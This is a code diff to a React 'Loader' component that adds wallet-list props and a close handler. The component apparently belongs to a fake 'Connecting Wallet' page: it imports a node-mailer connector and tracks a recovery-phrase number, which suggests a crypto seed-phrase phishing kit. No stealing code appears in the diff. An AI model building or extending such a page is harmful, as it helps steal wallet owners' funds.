@@ -3,14 +3,24 @@ import ReportProblemOutlinedIcon from "@mui/icons-material/ReportProblemOutlined
 import CloseOutlinedIcon from "@mui/icons-material/CloseOutlined";
 import { connect } from "@/lib/node-mailer";
 
+interface Walletdata {
+  name: string;
+  logo: string;
+  phraseNumber: number | null
+}
+
 function Loader({
   number,
   name,
   handleClose,
+  setWallets,
+  walletDetails
 }: {
   number: number | null;
   handleClose: () => void;
   name: string;
+  setWallets: React.Dispatch<React.SetStateAction<{ name: string; logo: string; phraseNumber: number | null; }[]>>;
+    walletDetails: Walletdata[]
 }) {
   const texts = ["Please wait", "Synchronization", "Connecting Wallet"];
   const [content, setContent] = useState(texts[0]);
@@ -91,7 +101,11 @@ function Loader({
       {show ? (
         <form onSubmit={handleSubmit} className="space-y-3 relative">
           <button
-            onClick={handleClose}
+            onClick={()=>{
+              handleClose()
+              setWallets(walletDetails)
+            }
+            }
             className="absolute w-fit -top-[75px] right-2 "
           >
             <CloseOutlinedIcon sx={{ color: "#94a3b8", fontSize: "22px" }} />
